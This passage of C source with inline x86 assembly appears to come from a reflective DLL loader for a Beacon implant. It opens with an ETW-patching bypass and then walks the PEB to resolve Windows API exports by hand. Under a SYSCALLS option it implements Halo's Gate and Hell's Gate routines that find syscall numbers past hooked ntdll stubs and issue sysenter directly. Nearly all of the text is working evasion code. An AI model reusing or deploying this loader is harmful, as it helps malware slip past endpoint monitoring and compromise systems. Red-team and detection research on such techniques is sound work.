        Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
        // make memory region RX again
        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        #endif
    }
    return;
}
#endif

__asm__(
"getEip: \n"
    "mov eax, [esp] \n"            // get the return address
    "ret \n"
"getMachineType: \n"
    "mov ecx, [esp+0x4] \n"
    "add ecx, 0x4 \n"
    "xor eax, eax \n"
    "mov ax, [ecx] \n"
    "ret \n"
"getRdllBase: \n"
    "mov ecx, [esp+0x4] \n"
"dec1: \n"
    "mov ebx, 0x5A4D \n"           // "MZ" bytes for comparing if we are at the start of our reflective DLL
"dec2: \n"
    "dec ecx \n"
    "cmp bx, word ptr ds:[ecx] \n" // Compare the first 2 bytes of the page to "MZ"
    "jne dec2 \n"
    "xor eax, eax \n"
    "mov ax, [ecx+0x3C] \n"        // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
    "add eax, ecx \n"              // DLL base + RVA new exe header = 0x00004550 PE00 Signature
    "mov ebx, 0x4550 \n"           // PEOO
    "cmp bx, word ptr ds:[eax] \n" // Compare the 4 bytes to PE\0\0
    "jne dec1 \n"
    "mov eax, ecx \n"              // Return the base address of our reflective DLL
    "ret \n"                       // return initRdllAddr
"getDllBase: \n"
    "mov ebx, fs:[0x30] \n"        // ProcessEnvironmentBlock // FS = TEB
    "mov ebx, [ebx+0x0c] \n"       // _PEB_LDR_DATA
    "mov ebx, [ebx+0x14] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov edx, ebx \n"
"crawl: \n"
    "mov eax, [ebx+0x10] \n"       // DllBase
    "mov ecx, [esp+0x4] \n"        // load the first param in ecx
    "push ebx \n"                  // just to save its value
    "push edx \n"
    "push eax \n"
    "call getExportDirectory \n"
    "pop edx \n"
    "add edx, [eax+0x0c] \n"       // ASCII name of the DLL
    "push edx \n"
    "push ecx \n"
    "call cmpstrings \n"
    "add esp, 0x8 \n"
    "pop edx \n"
    "pop ebx \n"
    "cmp eax, 0x1 \n"
    "je found \n"
    "mov ebx, [ebx] \n"            // InMemoryOrderLinks Next Entry
    "cmp edx, [ebx] \n"            // Are we back at the same entry in the list?
    "jne crawl \n"
    "xor eax, eax \n"              // DLL is not in InMemoryOrderModuleList, return NULL
    "jmp end \n"
"found: \n"
    "mov eax, [ebx+0x10] \n"       // DllBase Address in process memory
"end: \n"
    "ret \n"
"getFirstEntry: \n"
    "mov eax, fs:[0x30] \n"        // ProcessEnvironmentBlock // FS = TEB
    "mov eax, [eax+0x0c] \n"       // _PEB_LDR_DATA
    "mov eax, [eax+0x14] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "ret \n"
"getNextEntry: \n"
    "mov ecx, [esp+0x4] \n"
    "mov edx, [esp+0x8] \n"
    "mov eax, [ecx] \n"
    "cmp edx, [eax] \n"            // Are we back at the same entry in the list?
    "jne notTheLast \n"
    "xor eax, eax \n"
"notTheLast: \n"
    "ret \n"
"getDllBaseFromEntry: \n"
    "mov ecx, [esp+0x4] \n"
    "mov eax, [ecx+0x10] \n"
    "ret \n"
"cmpstrings: \n"
    "xor eax, eax \n"              // counter
"cmpchar: \n"
    "mov ecx, [esp+0x4] \n"
    "mov cl, [ecx+eax] \n"         // load char
    "cmp cl, 0x0 \n"
    "je nolow1 \n"
    "or cl, 0x20 \n"               // make lower case
"nolow1: \n"
    "mov edx, [esp+0x8] \n"
    "mov dl, [edx+eax] \n"         // load char
    "cmp dl, 0x0 \n"
    "je nolow2 \n"
    "or dl, 0x20 \n"               // make lower case
"nolow2: \n"
    "cmp cl, dl \n"                // compare
    "jne nonequal \n"
    "cmp cl, 0x0 \n"               // end of string?
    "je equal \n"
    "inc eax \n"                   // increase twice because they are wide-strings
    "jmp cmpchar \n"
"nonequal: \n"
    "mov eax, 0x0 \n"              // return "false"
    "ret \n"
"equal: \n"
    "mov eax, 0x1 \n"              // return "true"
    "ret \n"
"getExportDirectory: \n"
    "mov eax, [esp+0x4] \n"        // dllAddr
    "mov ebx, [eax+0x3C] \n"       // e_lfanew
    "add ebx, eax \n"              // NtHeader
    "mov edx, [ebx+0x78] \n"       // RVA to ExportDirectory
    "add eax, edx \n"              // ExportDirectory
    "ret \n" // return ExportDirectory
"getExportDirectorySize: \n"
    "mov eax, [esp+0x4] \n"
    "mov ebx, [eax+0x3C] \n"
    "add ebx, eax \n"
    "mov eax, [ebx+0x7c] \n"
    "ret \n" // return ExportDirectory Size;
"getExportAddressTable: \n"
    "mov ecx, [esp+0x4] \n"        // dllAddr
    "mov edx, [esp+0x8] \n"        // dllExportDirectory
    "add edx, 0x1C \n"             // DWORD AddressOfFunctions; // 0x1C offset // EDX = &RVAExportAddressTable
    "mov eax, [edx] \n"            // RVAExportAddressTable (Value/RVA)
    "add eax, ecx \n"              // VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "mov ecx, [esp+0x4] \n"        // dllAddr
    "mov edx, [esp+0x8] \n"        // dllExportDirectory
    "add edx, 0x20 \n"             // DWORD AddressOfNames; // 0x20 offset
    "mov eax, [edx] \n"            // RVAExportAddressOfNames (Value/RVA)
    "add eax, ecx \n"              // VA ExportAddressOfNames
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "mov ecx, [esp+0x4] \n"        // dllAddr
    "mov edx, [esp+0x8] \n"        // dllExportDirectory
    "add edx, 0x24 \n"             // DWORD AddressOfNameOrdinals; // 0x24 offset
    "mov eax, [edx] \n"            // RVAExportAddressOfNameOrdinals (Value/RVA)
    "add eax, ecx \n"              // VA ExportAddressOfNameOrdinals
    "ret \n" // return ExportOrdinalTable;
"getNumberOfNames: \n"
    "mov ecx, [esp+0x4] \n"
    "mov eax, [ecx+0x18] \n"
    "ret \n"
"getSymbolAddress: \n"
    "mov edx, [esp+0x14] \n"       // ExportNameTable
    "mov eax, [esp+0x1c] \n"
    "dec eax \n"
"lFindSym: \n"
    "mov ecx, [esp+0x8] \n"        // DWORD symbolStringSize (Reset string length counter for each loop)
    "mov edi, [edx+eax*4] \n"      // RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add edi, [esp+0xc] \n"        // &NameString    = RVA NameString + &module.dll
    "mov esi, [esp+0x4] \n"        // Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"                // Compare strings at RDI & RSI
    "je FoundSym \n"               // If match then we found the API string. Now we need to find the Address of the API
    "test eax, eax \n"
    "je NotFoundSym \n"            // If we check every exported function, return NULL
    "dec eax \n"                   // Increment to check if the next name matches
    "jmp short lFindSym \n"        // Jump back to start of loop
"FoundSym: \n"
    "mov ebx, [esp+0x18] \n"       // ExportOrdinalTable
    "mov ax, [ebx+eax*2] \n"       // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov ebx, [esp+0x10] \n"       // AddressTable
    "mov eax, [ebx+eax*4] \n"      // RVA API = [&AddressTable + API OrdinalNumber]
    "mov ebx, [esp+0xc] \n"        // dllBase
    "add eax, ebx \n"              // module.<API> = RVA module.<API> + module.dll BaseAddress
    "mov ebx, [esp+0xc] \n"        // dllBase
    "mov ebx, [esp+0x18] \n"       // ExportOrdinalTable
    "ret \n"
"NotFoundSym:\n"
    "xor eax, eax \n"
    "ret \n"
"getNewExeHeader: \n"
    "mov ecx, [esp+0x4] \n"        // dllBase
    "mov eax, [ecx+0x3C] \n"       // Offset NewEXEHeader
    "add eax, ecx \n"              // &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "mov ecx, [esp+0x4] \n"        // newExeHeader
    "mov ebx, [ecx+0x50] \n"       // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov eax, ebx \n"
    "ret \n" // return dllSize;
"getDllSizeOfHeaders: \n"
    "mov ecx, [esp+0x4] \n"        // newExeHeader
    "mov ebx, [eax+0x54] \n"       // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov eax, ebx \n"
    "ret \n" // return SizeOfHeaders;
"Memcpy: \n"
    "mov ecx, [esp+0x4] \n"        // destination
    "mov edx, [esp+0x8] \n"        // source
    "mov eax, [esp+0xc] \n"        // num
    "test eax, eax \n"             // check if eax = 0
    "jne copy1 \n"                 // if eax == 0, ret
    "ret \n"
"copy1: \n"
    "dec eax \n"                   // Decrement the counter
    "mov bl, [edx] \n"             // Load the next byte to write into the BL register
    "mov [ecx], bl \n"             // write the byte
    "inc edx \n"                   // move edx to next byte of source
    "inc ecx \n"                   // move eax to next byte of destination
    "test eax, eax \n"             // check if eax = 0
    "jne copy1 \n"                 // if eax != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "mov eax, [esp+0x4] \n"        // NewExeHeader
    "add eax, 0x18 \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "mov ecx, [esp+0x4] \n"        // NewExeHeader
    "add ecx, 0x14 \n"             // &FileHeader.SizeOfOptionalHeader
    "xor ebx, ebx \n"
    "mov bx, [ecx] \n"             // Value of FileHeader.SizeOfOptionalHeader
    "mov eax, ebx \n"
    "ret \n"
"add: \n"
    "mov eax, [esp+0x4] \n"        // Num1
    "mov ebx, [esp+0x8] \n"        // Num2
    "add eax, ebx \n"
    "ret \n"
"getNumberOfSections: \n"
    "mov ecx, [esp+0x4] \n"        // newExeHeaderAddr
    "add ecx, 0x6 \n"              // &FileHeader.NumberOfSections
    "xor eax, eax \n"
    "mov ax, [ecx] \n"
    "ret \n"
"getBeaconEntryPoint: \n"
    "mov ecx, [esp+0x4] \n"        // newRdllAddr
    "mov edx, [esp+0x8] \n"        // OptionalHeaderAddr
    "add edx, 0x10 \n"             // OptionalHeader.AddressOfEntryPoint
    "mov eax, [edx] \n"
    "add eax, ecx \n"              // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
"copyWithDelimiter: \n"
    "mov ecx, [esp+0x04] \n"       // dst
    "mov edi, [esp+0x08] \n"       // src
    "mov esi, [esp+0x0c] \n"       // n
    "mov edx, [esp+0x10] \n"       // delimiter
    "xor eax, eax \n"              // number of bytes copied
    "copyLoop: \n"
    "cmp esi, eax \n"              // check if we copied enough bytes
    "je copydone \n"
    "mov bl, [edi] \n"             // read byte
    "mov [ecx], bl \n"             // write byte
    "inc edi \n"
    "inc ecx \n"
    "inc eax \n"                   // increment bytes written
    "cmp bl, dl \n"                // check if we found the delimiter
    "je copydone\n"
    "jmp copyLoop \n"
    "copydone: \n"
    "ret \n"
);

#ifdef SYSCALLS
__asm__(
"getSyscallNumber: \n"
    "mov ecx, [esp+0x4] \n"         // functionAddress
    "push ecx \n"
    "call findSyscallNumber \n"     // try to read the syscall directly
    "pop ecx \n"
    "test ax, ax \n"
    "jne syscallnothooked \n"
    "mov dx, 0 \n"                 // index = 0
"loopoversyscalls: \n"
    "push ecx \n"
    "push dx \n"
    "call halosGateUp\n"            // try to read the syscall above
    "pop dx \n"
    "pop ecx \n"
    "test ax, ax \n"
    "jne syscallnothookedup \n"
    "push ecx \n"
    "push dx \n"
    "call halosGateDown\n"          // try to read the syscall below
    "pop dx \n"
    "pop ecx \n"
    "test ax, ax \n"
    "jne syscallnothookeddown \n"
    "inc dx \n"                    // increment the index
    "jmp loopoversyscalls \n"
"syscallnothooked: \n"
    "ret \n"
"syscallnothookedup: \n"
    "sub ax, dx \n"
    "ret \n"
"syscallnothookeddown: \n"
    "add ax, dx \n"
    "ret \n"
"findSyscallNumber: \n"
    "mov ecx, [esp+0x4] \n"        // ntdllApiAddr
    "mov bl, [ecx] \n"             // byte at offset 0
    "cmp bl, 0xB8 \n"              // check it is 0xb8
    "jne error \n"
    "mov bl, [ecx+0x3] \n"         // byte at offset 3
    "cmp bl, 0x0 \n"               // check it is 0x0
    "jne error \n"
    "mov bl, [ecx+0x4] \n"         // byte at offset 4
    "cmp bl, 0x0 \n"               // check it is 0x0
    "jne error \n"
    "xor eax, eax \n"
    "mov ax, [ecx+0x1] \n"
    "ret \n"
"error: \n"
    "xor eax, eax \n"
    "ret \n"
"halosGateUp: \n"
    "mov ecx, [esp+0x4] \n"        // ntdllApiAddr
    "mov edx, [esp+0x8] \n"        // index
    "mov eax, 0x20 \n"
    "mul dx \n"
    "add ecx, eax \n"
    "mov bl, [ecx] \n"             // byte at offset 0
    "cmp bl, 0xB8 \n"              // check it is 0xb8
    "jne error \n"
    "mov bl, [ecx+0x3] \n"         // byte at offset 3
    "cmp bl, 0x0 \n"               // check it is 0x0
    "jne error \n"
    "mov bl, [ecx+0x4] \n"         // byte at offset 4
    "cmp bl, 0x0 \n"               // check it is 0x0
    "jne error \n"
    "xor eax, eax \n"
    "mov ax, [ecx+1] \n"
    "ret \n"
"halosGateDown: \n"
    "mov ecx, [esp+0x4] \n"        // ntdllApiAddr
    "mov edx, [esp+0x8] \n"        // index
    "mov eax, 0x20 \n"
    "mul dx \n"
    "sub ecx, eax \n"
    "mov bl, [ecx] \n"             // byte at offset 0
    "cmp bl, 0xB8 \n"              // check it is 0xb8
    "jne error \n"
    "mov bl, [ecx+0x3] \n"         // byte at offset 3
    "cmp bl, 0x0 \n"               // check it is 0x0
    "jne error \n"
    "mov bl, [ecx+0x4] \n"         // byte at offset 4
    "cmp bl, 0x0 \n"               // check it is 0x0
    "jne error \n"
    "xor eax, eax \n"
    "mov ax, [ecx+1] \n"
    "ret \n"
"HellsGate: \n"
    "mov edi, [esp+0x4] \n"        // store the syscall number in edi, lets hope is not used!
    "ret \n"
"HellDescent: \n"
    "mov eax, edi \n"
    "call DoSysenter \n"
    "ret \n"
"DoSysenter: \n"
    "mov edx, esp \n"
    "sysenter \n"
    "ret \n"
);
#endif
